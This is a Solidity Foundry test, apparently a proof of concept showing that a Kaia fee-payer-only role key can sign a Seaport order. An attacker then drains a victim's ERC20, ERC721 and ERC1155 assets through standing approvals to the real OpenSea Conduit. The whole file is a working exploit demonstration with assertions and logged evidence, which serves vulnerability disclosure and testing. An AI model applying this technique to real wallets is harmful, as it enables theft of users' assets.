// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {console2} from "forge-std/console2.sol";
import {KaiaRoleCollapseTest, OrderComponents, Order} from "./KaiaRoleCollapse.t.sol";

contract KaiaRoleCollapseConduitTest is KaiaRoleCollapseTest {
    address internal constant OPENSEA_CONDUIT =
        0x1e0049783f008a0085193e00003d00cd54003c71;

    event ConduitAuthorizationDelta(
        address indexed victim,
        address indexed attacker,
        bytes32 indexed orderHash,
        bytes32 conduitKey,
        bytes32 conduitCodeHash,
        uint256 erc20Before,
        uint256 erc20After,
        address erc721Before,
        address erc721After,
        uint256 erc1155Before,
        uint256 erc1155After
    );

    function testRoleFeePayerOnlyKeyDrainsThroughExactOpenSeaConduit() public {
        bytes32 conduitKey = vm.envBytes32("OPENSEA_CONDUIT_KEY");
        bytes32 expectedConduitCodeHash = vm.envBytes32("OPENSEA_CONDUIT_CODEHASH");

        assertGt(OPENSEA_CONDUIT.code.length, 0, "CONDUIT_NOT_DEPLOYED");
        assertEq(
            OPENSEA_CONDUIT.codehash,
            expectedConduitCodeHash,
            "WRONG_CONDUIT_RUNTIME"
        );

        // Remove every direct Seaport approval and retain only standing
        // approvals to the exact OpenSea Conduit.
        vm.startPrank(victim);
        token20.approve(SEAPORT, 0);
        token721.setApprovalForAll(SEAPORT, false);
        token1155.setApprovalForAll(SEAPORT, false);
        token20.approve(OPENSEA_CONDUIT, type(uint256).max);
        token721.setApprovalForAll(OPENSEA_CONDUIT, true);
        token1155.setApprovalForAll(OPENSEA_CONDUIT, true);
        vm.stopPrank();

        assertEq(token20.allowance(victim, SEAPORT), 0, "DIRECT_ERC20_APPROVAL");
        assertFalse(
            token721.isApprovedForAll(victim, SEAPORT),
            "DIRECT_ERC721_APPROVAL"
        );
        assertFalse(
            token1155.isApprovedForAll(victim, SEAPORT),
            "DIRECT_ERC1155_APPROVAL"
        );
        assertEq(
            token20.allowance(victim, OPENSEA_CONDUIT),
            type(uint256).max,
            "CONDUIT_ERC20_APPROVAL_MISSING"
        );
        assertTrue(
            token721.isApprovedForAll(victim, OPENSEA_CONDUIT),
            "CONDUIT_ERC721_APPROVAL_MISSING"
        );
        assertTrue(
            token1155.isApprovedForAll(victim, OPENSEA_CONDUIT),
            "CONDUIT_ERC1155_APPROVAL_MISSING"
        );

        OrderComponents memory c = _components(0xC0D017);
        c.conduitKey = conduitKey;
        Order memory order = _signedOrder(c, FEE_PAYER_ONLY_PK);
        bytes32 orderHash = seaport.getOrderHash(c);

        uint256 erc20Before = token20.balanceOf(victim);
        address erc721Before = token721.ownerOf(ERC721_ID);
        uint256 erc1155Before = token1155.balanceOf(victim, ERC1155_ID);

        vm.prank(attacker);
        assertTrue(seaport.fulfillOrder(order, bytes32(0)), "CONDUIT_FULFILL_FAILED");

        uint256 erc20After = token20.balanceOf(victim);
        address erc721After = token721.ownerOf(ERC721_ID);
        uint256 erc1155After = token1155.balanceOf(victim, ERC1155_ID);

        assertEq(erc20Before, ERC20_AMOUNT, "BAD_ERC20_PREBALANCE");
        assertEq(erc20After, 0, "CONDUIT_ERC20_NOT_DRAINED");
        assertEq(
            token20.balanceOf(attacker),
            ERC20_AMOUNT,
            "CONDUIT_ATTACKER_ERC20_DELTA"
        );
        assertEq(erc721Before, victim, "BAD_ERC721_PREOWNER");
        assertEq(erc721After, attacker, "CONDUIT_ERC721_NOT_DRAINED");
        assertEq(erc1155Before, ERC1155_AMOUNT, "BAD_ERC1155_PREBALANCE");
        assertEq(erc1155After, 0, "CONDUIT_ERC1155_NOT_DRAINED");
        assertEq(
            token1155.balanceOf(attacker, ERC1155_ID),
            ERC1155_AMOUNT,
            "CONDUIT_ATTACKER_ERC1155_DELTA"
        );

        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);
        assertTrue(validated, "CONDUIT_ORDER_NOT_VALIDATED");
        assertFalse(cancelled, "CONDUIT_ORDER_CANCELLED");
        assertEq(filled, 1, "CONDUIT_WRONG_FINAL_NUMERATOR");
        assertEq(size, 1, "CONDUIT_WRONG_FINAL_DENOMINATOR");

        emit ConduitAuthorizationDelta(
            victim,
            attacker,
            orderHash,
            conduitKey,
            OPENSEA_CONDUIT.codehash,
            erc20Before,
            erc20After,
            erc721Before,
            erc721After,
            erc1155Before,
            erc1155After
        );

        console2.log("KAIA_ROLE_COLLAPSE_CONDUIT_WITNESS");
        console2.log("victim", victim);
        console2.log("attacker", attacker);
        console2.log("conduit", OPENSEA_CONDUIT);
        console2.logBytes32(conduitKey);
        console2.logBytes32(OPENSEA_CONDUIT.codehash);
        console2.logBytes32(orderHash);
    }
}
